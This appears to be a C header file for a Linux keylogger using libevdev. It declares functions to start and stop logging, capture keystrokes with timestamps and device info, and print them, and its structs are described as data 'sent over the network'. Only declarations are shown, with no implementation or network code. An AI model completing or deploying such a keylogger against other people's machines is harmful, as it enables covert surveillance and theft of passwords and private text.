#pragma once

#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

/**
 * Represents all the associated data for one key that was pressed
 */
typedef struct {
  char* key;         // A string representing a key that was pressed.
  char* timestamp;   // The approximate time (UTC) that the key was pressed.
  // char* application; /* Represents the active application of the user when they
  //                       pressed the key. */
} key_info;

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  key_info* keys;        // An array of keys to be sent over the network.
  size_t keys_arr_size;
  char* device_info;  // A string representing the device type of the user.
} key_package;

/**
 * Documentation here
 */
void begin_keylogger(void);

/**
 * Documentation here
 */
void end_keylogger(void);

/**
 * Logs the current device.
 * 
 * @param key_package A pointer to a key_package instance. Used to hold all
 * data for the overall session.
 */
void log_device(key_package* key_package);

/**
 * Helper function to parse large amounts of incoming events.
 * 
 * If the device sends events faster than can be read, the kernel buffers will
 * fill up and the kernel will skip events. This function resyncs the device
 * and updates the internal state before reading events again.
 * 
 * @param dev A pointer to a libevdev instance, representing the built-in keyboard
 */
void handle_syn_dropped(struct libevdev* dev);

/**
 * Runs an infinite loop to store user keystrokes.
 * 
 * Can be exited with the `c` key. Upon exit, writes all keys into the
 * key_package struct, in chronological order.
 * 
 * @param key_package A pointer to a key_package instance. Used to hold an array
 * of key data for the overall session.
 */
void log_keys(key_package* key_package);

/**
 * Given a key_package instance, prints all stored keys in the order they
 * appear in the array.
 * 
 * @param key_package A pointer to a key_package instance. Used to hold all
 * data for the overall session.
 */
void print_logged_keys(key_package key_package);
